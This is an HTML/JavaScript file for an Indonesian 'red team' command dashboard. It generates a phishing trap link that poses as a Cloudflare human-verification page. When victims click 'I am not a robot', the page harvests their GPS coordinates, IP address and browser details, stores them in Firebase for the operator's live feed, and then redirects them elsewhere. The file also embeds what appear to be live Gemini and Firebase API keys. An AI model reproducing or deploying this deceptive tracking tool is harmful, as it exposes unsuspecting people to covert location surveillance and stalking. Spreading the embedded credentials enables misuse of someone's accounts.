<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Mazkiplay | Fullstack Command Center</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@700&display=swap" rel="stylesheet">
    <style>
        :root { 
            --neon-green: #00ff41; 
            --neon-red: #ff0000; 
            --bg-dark: #050505;
        }
        body { 
            background-color: var(--bg-dark); 
            color: var(--neon-green); 
            font-family: 'JetBrains Mono', monospace; 
            overflow-x: hidden;
        }
        .cyber-header { font-family: 'Orbitron', sans-serif; }
        .glass { 
            background: rgba(10, 10, 10, 0.9); 
            border: 1px solid #1a1a1a; 
            box-shadow: 0 0 15px rgba(0, 255, 65, 0.1); 
        }
        .terminal { 
            background: #000; 
            border-left: 3px solid var(--neon-green); 
            padding: 10px; 
            font-size: 11px; 
            height: 400px; 
            overflow-y: auto; 
            scrollbar-width: thin;
            scrollbar-color: var(--neon-green) #000;
        }
        .tab-btn { 
            transition: all 0.3s ease; 
            border-bottom: 2px solid transparent; 
            cursor: pointer; 
        }
        .tab-btn.active { 
            border-color: var(--neon-red); 
            color: white; 
            background: rgba(255,0,0,0.1); 
        }
        input:focus { border-color: var(--neon-green) !important; }
        
        @keyframes pulse-red {
            0% { box-shadow: 0 0 5px #ff0000; }
            50% { box-shadow: 0 0 20px #ff0000; }
            100% { box-shadow: 0 0 5px #ff0000; }
        }
        .alert-active { animation: pulse-red 2s infinite; border-color: #ff0000 !important; }
    </style>
</head>
<body class="p-2 md:p-6">

    <div id="app-root" class="max-w-6xl mx-auto">
        <!-- UI: DASHBOARD (ADMIN) -->
        <div id="admin-panel" class="space-y-4">
            <header class="flex flex-col md:flex-row justify-between items-center gap-4 mb-6">
                <div class="text-center md:text-left">
                    <h1 class="cyber-header text-3xl font-black text-red-600 tracking-tighter">MAZKIPLAY FS</h1>
                    <p class="text-[10px] text-gray-500 uppercase tracking-widest">Pusat Kendali Intelijen & Operasi Red Team</p>
                </div>
                <div class="flex gap-2">
                    <div class="glass px-4 py-2 rounded text-[9px]">SISTEM: <span id="db-status" class="text-yellow-500 italic">MENGHUBUNGKAN...</span></div>
                    <div class="glass px-4 py-2 rounded text-[9px]">DATA: <span id="target-count" class="text-red-500 font-bold">0</span></div>
                </div>
            </header>

            <div class="grid grid-cols-1 lg:grid-cols-4 gap-4">
                <nav class="lg:col-span-1 space-y-2">
                    <button onclick="switchTab('monitor')" id="btn-monitor" class="tab-btn active w-full text-left p-3 glass rounded text-xs">üì° MONITOR LIVE</button>
                    <button onclick="switchTab('gen')" id="btn-gen" class="tab-btn w-full text-left p-3 glass rounded text-xs">üîó JEBAKAN LINK</button>
                    <button onclick="switchTab('ai')" id="btn-ai" class="tab-btn w-full text-left p-3 glass rounded text-xs">ü§ñ AI TAKTIS (GEMINI)</button>
                    
                    <div class="p-4 mt-4 glass rounded text-[9px] text-gray-400 leading-relaxed border-l-2 border-red-600">
                        <p class="font-bold text-red-500 mb-1 uppercase">Log Aktivitas:</p>
                        <div id="system-logs" class="space-y-1 h-32 overflow-y-auto">
                            <div>> Memulai inisialisasi kernel...</div>
                        </div>
                    </div>
                </nav>

                <main class="lg:col-span-3 glass rounded-xl p-4 min-h-[550px] relative">
                    <!-- Tab: Monitor -->
                    <div id="tab-monitor" class="tab-pane">
                        <div class="flex justify-between items-center mb-4 border-b border-gray-800 pb-2">
                            <h2 class="text-white font-bold text-xs uppercase tracking-widest">Feed Intelijen Target</h2>
                            <span class="text-[9px] text-green-500 animate-pulse">‚óè LIVE UPDATING</span>
                        </div>
                        <div id="feed-container" class="terminal space-y-4 text-green-500">
                            <div class="text-gray-700 italic">Menghubungkan ke database satelit...</div>
                        </div>
                    </div>

                    <!-- Tab: Link Generator -->
                    <div id="tab-gen" class="tab-pane hidden">
                        <h2 class="text-white font-bold mb-4 text-xs uppercase tracking-widest border-b border-gray-800 pb-2">Deployment Payload</h2>
                        <div class="space-y-6">
                            <div class="p-4 bg-red-900/10 border border-red-900/30 rounded">
                                <label class="text-[10px] text-red-500 font-bold block mb-2 uppercase">Halaman Pengalihan (Redirect)</label>
                                <input type="text" id="redirect-input" value="https://www.google.com" class="w-full bg-black border border-gray-800 p-2 text-xs outline-none text-white rounded">
                                <p class="text-[8px] text-gray-500 mt-1 italic">*Target akan dikirim ke sini setelah koordinat diambil.</p>
                            </div>
                            <div class="p-4 glass rounded border-l-4 border-blue-600">
                                <label class="text-[10px] text-gray-400 block mb-2 font-bold">LINK TRAP ANDA:</label>
                                <div class="flex gap-2">
                                    <input type="text" id="trap-url" readonly class="flex-1 bg-transparent text-blue-400 text-xs outline-none font-bold">
                                    <button onclick="copyTrapLink()" class="bg-blue-600 hover:bg-blue-500 text-white px-4 py-1 rounded text-[10px] font-bold transition">SALIN</button>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Tab: AI Taktis -->
                    <div id="tab-ai" class="tab-pane hidden flex flex-col h-[500px]">
                        <h2 class="text-white font-bold mb-4 text-xs uppercase tracking-widest border-b border-gray-800 pb-2">Tactical Intelligence AI</h2>
                        <div id="ai-chat" class="terminal flex-1 mb-4 text-green-400 overflow-y-auto">
                            <div class="text-gray-500 italic">> Menunggu instruksi strategis...</div>
                        </div>
                        <div class="flex gap-2">
                            <input type="text" id="ai-input" placeholder="Tanyakan analisis skrip atau target..." 
                                class="flex-1 bg-black border border-gray-800 p-3 text-xs text-white rounded outline-none"
                                onkeypress="if(event.key==='Enter') askAI()">
                            <button onclick="askAI()" id="ai-send-btn" class="bg-green-600 hover:bg-green-500 text-black px-6 font-bold text-xs rounded transition uppercase">Eksekusi</button>
                        </div>
                    </div>
                </main>
            </div>
        </div>

        <!-- UI: TRAP PAGE (Target View) -->
        <div id="trap-page" class="hidden fixed inset-0 bg-white z-[9999] flex items-center justify-center p-6 text-center">
            <div class="max-w-sm w-full">
                <div class="mb-8">
                    <div class="w-16 h-16 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
                    <h1 class="text-2xl font-bold text-gray-800">Verifikasi Perangkat</h1>
                    <p class="text-gray-500 text-sm mt-2 leading-relaxed">Sistem kami mendeteksi aktivitas mencurigakan. Izinkan akses lokasi untuk memverifikasi bahwa Anda adalah manusia.</p>
                </div>
                <button id="btn-verify" class="w-full bg-blue-600 hover:bg-blue-700 text-white py-4 rounded-xl font-bold text-lg shadow-lg active:scale-95 transition">SAYA BUKAN ROBOT</button>
                <p class="text-[10px] text-gray-400 mt-6">Powered by Cloudflare Security Verification</p>
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
        import { getFirestore, collection, addDoc, onSnapshot, query, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
        import { getAuth, signInAnonymously, onAuthStateChanged, signInWithCustomToken } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";

        // Konfigurasi Global
        const geminiApiKey = "AIzaSyDINRKcVKNFIrxWUoyeSg9R03IYCHGR_DU";
        const appId = typeof __app_id !== 'undefined' ? __app_id : 'mazki-red-v2';
        let db, auth, currentUser;

        async function initSystem() {
            addLog("Mengaktifkan modul sistem...");
            
            const firebaseConfig = {
                apiKey: "AIzaSyC8XeElXIoVdYMCFH16nXnE8q92RvuOOtM",
                authDomain: "mazkiplaycheck.firebaseapp.com",
                projectId: "mazkiplaycheck",
                storageBucket: "mazkiplaycheck.firebasestorage.app",
                messagingSenderId: "662285872996",
                appId: "1:662285872996:web:9249e209bda07e52b95471"
            };

            try {
                const app = initializeApp(firebaseConfig);
                db = getFirestore(app);
                auth = getAuth(app);

                // Autentikasi sesuai RULE 3 dengan fallback untuk mengatasi custom-token-mismatch
                const initAuth = async () => {
                    addLog("Menghubungkan gerbang enkripsi...");
                    try {
                        if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
                            await signInWithCustomToken(auth, __initial_auth_token);
                            addLog("Autentikasi token berhasil.");
                        } else {
                            await signInAnonymously(auth);
                            addLog("Autentikasi anonim berhasil.");
                        }
                    } catch (authError) {
                        console.warn("Custom token failed, falling back to anonymous:", authError);
                        addLog("Token mismatch. Mencoba akses anonim...");
                        await signInAnonymously(auth);
                    }
                };
                
                await initAuth();

                onAuthStateChanged(auth, (user) => {
                    if (user) {
                        currentUser = user;
                        addLog(`Sesi aktif: ${user.uid.substring(0,8)}`);
                        updateStatus("ONLINE", "text-green-500 font-bold");
                        checkRoute();
                    } else {
                        updateStatus("OFFLINE", "text-red-500");
                        addLog("Sesi terputus.");
                    }
                });

            } catch (err) {
                console.error(err);
                addLog("CRITICAL ERROR: Kernel gagal dimuat.");
                updateStatus("FAILURE", "text-red-500");
            }
        }

        function checkRoute() {
            const params = new URLSearchParams(window.location.search);
            if (params.get('view') === 'trap') {
                renderTrap();
            } else {
                renderDashboard();
            }
        }

        function renderDashboard() {
            const baseUrl = window.location.href.split('?')[0];
            document.getElementById('trap-url').value = `${baseUrl}?view=trap`;

            if (!currentUser) return;

            // Path Firestore sesuai RULE 1
            const colRef = collection(db, 'artifacts', appId, 'public', 'data', 'traps');
            
            onSnapshot(query(colRef), (snap) => {
                const feed = document.getElementById('feed-container');
                const count = document.getElementById('target-count');
                count.innerText = snap.docs.length;

                if (snap.empty) {
                    feed.innerHTML = `<div class="text-gray-700 italic text-center py-20 uppercase tracking-widest opacity-50">-- Zero Subjects Detected --</div>`;
                    return;
                }

                feed.innerHTML = snap.docs.map(doc => {
                    const d = doc.data();
                    const ts = d.timestamp ? new Date(d.timestamp.seconds * 1000).toLocaleString('id-ID') : 'Baru';
                    return `
                        <div class="p-3 mb-2 glass border-l-2 border-red-600">
                            <div class="flex justify-between items-start mb-2">
                                <span class="text-red-500 font-bold text-[10px] tracking-tighter">[ DATA TERTANGKAP ]</span>
                                <span class="text-[8px] text-gray-600">${ts}</span>
                            </div>
                            <div class="grid grid-cols-2 gap-2 text-[10px]">
                                <div>
                                    <p class="text-[8px] text-gray-500 uppercase">IP Address</p>
                                    <p class="text-white font-bold">${d.ip || '0.0.0.0'}</p>
                                </div>
                                <div>
                                    <p class="text-[8px] text-gray-500 uppercase">Koordinat</p>
                                    <a href="https://www.google.com/maps?q=${d.lat},${d.lon}" target="_blank" class="text-blue-500 underline font-bold">LIHAT LOKASI</a>
                                </div>
                            </div>
                        </div>
                    `;
                }).join('');
            }, (err) => {
                addLog("DB_ERROR: Akses koleksi ditolak. Cek Firebase Rules.");
            });
        }

        function renderTrap() {
            document.getElementById('admin-panel').classList.add('hidden');
            document.getElementById('trap-page').classList.remove('hidden');
            document.body.style.backgroundColor = "white";

            document.getElementById('btn-verify').onclick = async () => {
                const btn = document.getElementById('btn-verify');
                btn.disabled = true;
                btn.innerText = "MEMPROSES...";

                // Pastikan auth siap
                if (!currentUser) {
                    addLog("Menunggu sinkronisasi auth...");
                    await new Promise(r => setTimeout(r, 2000));
                }

                navigator.geolocation.getCurrentPosition(async (pos) => {
                    let ip = "unknown";
                    try { 
                        const r = await fetch('https://api.ipify.org?format=json'); 
                        const j = await r.json(); ip = j.ip; 
                    } catch(e) {}

                    try {
                        if (!currentUser) throw new Error("User belum terautentikasi");

                        // Menambah data ke koleksi public sesuai RULE 1
                        await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'traps'), {
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            ip: ip,
                            timestamp: serverTimestamp(),
                            agent: navigator.userAgent
                        });

                        const redirect = document.getElementById('redirect-input').value || "https://google.com";
                        window.location.href = redirect;
                    } catch (e) {
                        console.error("Firestore Error:", e);
                        alert("Gagal memverifikasi. Silakan muat ulang halaman.");
                        btn.disabled = false;
                        btn.innerText = "SAYA BUKAN ROBOT";
                    }
                }, (err) => {
                    alert("Akses lokasi diperlukan untuk memproses keamanan Cloudflare.");
                    btn.disabled = false;
                    btn.innerText = "SAYA BUKAN ROBOT";
                }, { enableHighAccuracy: true });
            };
        }

        // AI Taktis dengan Gemini API Key
        window.askAI = async () => {
            const input = document.getElementById('ai-input');
            const chat = document.getElementById('ai-chat');
            const btn = document.getElementById('ai-send-btn');
            const prompt = input.value.trim();
            if (!prompt) return;

            chat.innerHTML += `<div class="text-white mb-2 font-bold uppercase text-[10px]">> USER: ${prompt}</div>`;
            input.value = "";
            btn.disabled = true;
            btn.innerText = "EKSEKUSI...";

            try {
                const response = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-09-2025:generateContent?key=${geminiApiKey}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        contents: [{ parts: [{ text: prompt }] }],
                        systemInstruction: { 
                            parts: [{ text: "Anda adalah Mazki AI, asisten taktis profesional untuk operasi keamanan siber. Jawab dengan cerdas, teknis, dan dalam bahasa Indonesia." }] 
                        }
                    })
                });

                if (!response.ok) throw new Error("API_ERROR");
                
                const data = await response.json();
                const reply = data.candidates?.[0]?.content?.parts?.[0]?.text || "Maaf, kernel AI tidak memberikan respons.";
                chat.innerHTML += `<div class="text-blue-400 mb-4 bg-gray-900/40 p-2 border-l border-blue-600">MAZKI_AI: ${reply}</div>`;
            } catch (err) {
                console.error(err);
                chat.innerHTML += `<div class="text-red-500 text-[9px] italic">[ SISTEM GAGAL: CEK API KEY ATAU KUOTA ]</div>`;
            } finally {
                btn.disabled = false;
                btn.innerText = "EKSEKUSI";
                chat.scrollTop = chat.scrollHeight;
            }
        };

        function addLog(text) {
            const logs = document.getElementById('system-logs');
            if (logs) {
                const entry = document.createElement('div');
                entry.innerText = `> ${text}`;
                logs.appendChild(entry);
                logs.scrollTop = logs.scrollHeight;
            }
        }

        function updateStatus(text, className) {
            const el = document.getElementById('db-status');
            if (el) { el.innerText = text; el.className = className; }
        }

        window.switchTab = (id) => {
            document.querySelectorAll('.tab-pane').forEach(p => p.classList.add('hidden'));
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            document.getElementById('tab-' + id).classList.remove('hidden');
            document.getElementById('btn-' + id).classList.add('active');
        };

        window.copyTrapLink = () => {
            const el = document.getElementById("trap-url");
            el.select();
            document.execCommand("copy");
            alert("URL Payload disalin. Sebarkan ke target.");
        };

        initSystem();
    </script>
</body>
</html>
